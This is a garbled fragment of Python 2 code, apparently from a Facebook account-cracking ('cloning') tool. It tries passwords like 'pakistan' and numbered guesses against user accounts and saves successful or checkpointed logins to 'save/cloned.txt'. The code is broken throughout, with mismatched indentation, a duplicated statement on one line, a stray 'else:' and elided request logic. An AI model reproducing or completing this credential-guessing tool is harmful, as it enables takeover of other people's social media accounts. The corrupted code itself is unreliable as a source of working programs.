                                    ...
                                    if 'access_token' in q:
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            ...
                                            if 'access_token' in q:
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(✖) ' + k + c + user + '() ' + pass6
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass6+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass6)       cpb.append(c+user+pass6)
                                               else:
                                            pass7="pakistan"
                                            ...
                                            if 'access_token' in q:
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(✖) ' + k + c + user + '() ' + pass7
                                                    cps = open('save/cloned.txt', 'a')
                                            ...
                                            if 'access_token' in q:
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(✖) ' + k + c + user + '() ' + pass8
                                                    cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(🆗)  ' + k + c + user + '  []  ' + pass9
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(✖) ' + k + c + user + '() ' + pass9
                                                    cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(🆗)  ' + k + c + user + '  []  ' + pass10
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(✖) ' + k + c + user + '() ' + pass10
                                                    cps = open('save/cloned.txt', 'a')
